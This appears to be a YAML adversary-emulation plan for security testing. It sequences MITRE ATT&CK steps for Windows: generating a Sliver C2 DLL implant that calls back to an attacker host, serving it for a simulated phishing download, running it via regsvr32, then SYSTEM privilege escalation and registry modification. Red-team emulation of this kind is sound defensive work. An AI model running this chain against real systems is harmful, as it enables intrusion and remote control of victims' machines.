emulation_plan_details:
  adversary_name: test
  creation_time: 2025-04-25 22:12:25 UTC+0000
attack_action_sequence:
  - uuid: bb2176c4-855e-4b52-ab03-5fe2e58d8129
    name: Build DLL Sliver implant
    id:
      - T1071.001
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - Application Layer Protocol - Web Protocols
    description: |
      The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.
    execution:
      executor: Sliver Console
      command: |
        sliver > generate --mlts #{LHOST}:#{LPORT} --os windows --arch 64bit --format shared --save #{SAVE_PATH}
        sliver > mlts --lport #{LPORT}
    arguments:
      LHOST:
        default:
        description: IP address of the attacker machine
        type:
      LPORT:
        default:
        description: listening port of the attacter machine
        type:
      SAVE_PATH:
        default:
        description: Saved path of the generated payload
        type:
  - uuid: 7480189e-1a4b-45f5-b225-c102915f7262
    name: Simulate the victim download a file on its machine
    id:
      - T1566.002
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Initial Access
    technique:
      - 'Phishing: Spearphishing Link'
    description: This step simulates the victim accidentally downloads a malicious
      file by clicking a link.
    execution:
      executor: Human
      command: |
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the file on the attacker's machine
        3. Download the file to #{PATH}
    arguments:
      LHOST:
        default:
        description: IP address of the attacker machine
        type:
      LPORT:
        default:
        description: listening port of the attacter machine
        type:
      SAVE_PATH:
        default:
        description: Saved path of the downloaded payload
        type:
  - uuid: 5b852063-ca39-4600-b246-024897721010
    name: Simulate the victim execute a DLL file on its machine
    id:
      - T1204.002
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique:
      - 'User Execution: Malicious File'
    description: This step simulates the victim executes a DLL file on its machine.
    execution:
      executor: Human
      command: |
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On victim's machine, use PowerShell or Command Prompt)
        regsvr32 #{DLL_PATH}
    arguments:
      DLL_PATH:
        default:
        description: Saved path of the DLL file
        type:
  - uuid: 1f401bbe-de24-41d2-8e34-d026e25bfb94
    name: Execute a Sliver Implant Payload
    id:
      - T1071.001
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - Application Layer Protocol - Web Protocols
    description: |
      Executing a Sliver implant payload will establish a Sliver session.
    execution:
      executor: None
      command: |
        None
    arguments:
  - uuid: 5a1d2b9f-4e7f-8a4d-3f7a-6c2e5e9f9f7c
    name: Privilege Escalation
    id:
      - T1134
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Privilege Escalation
    technique:
      - Access Token Manipulation
    description: The `get_system` command attempts to gain SYSTEM-level privileges.
    execution:
      executor: Sliver Executor
      command: get_system (#{hosting_process},#{config},#{SessionID})
    arguments:
      hosting_process:
        description: Target process ID or name for privilege escalation
      config:
        description: Configuration options for escalation method
        default: Service
      SessionID:
        description: The session ID of the active Sliver connection.
  - uuid: 2d3c5f1e-4a7c-b6d4-2e8f-1a9c0b5e9a8b
    name: Registry Modification
    id:
      - T1112
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
    technique:
      - Modify Registry
    description: The `registry_write` command modifies Windows registry values.
    execution:
      executor: Sliver Executor
      command: registry_write 
        (#{hive},#{reg_path},#{key},#{hostname},#{string_value},#{byte_value},#{dword_value},#{qword_value},#{reg_type},#{SessionID})
    arguments:
      hive:
        description: Registry hive (HKLM/HKCU/HKU)
      reg_path:
        description: Path to registry key
      key:
        description: Value name to modify
      hostname:
        description: Target hostname for remote registry access
      string_value:
        description: String value data
      byte_value:
        description: Binary value data (hex format)
      dword_value:
        description: 32-bit integer value
      qword_value:
        description: 64-bit integer value
      reg_type:
        description: Registry value type (REG_SZ/REG_BINARY/REG_DWORD/REG_QWORD)
      SessionID:
        description: The session ID of the active Sliver connection.
testbed_requirement:
  OS: []
  CVE: []
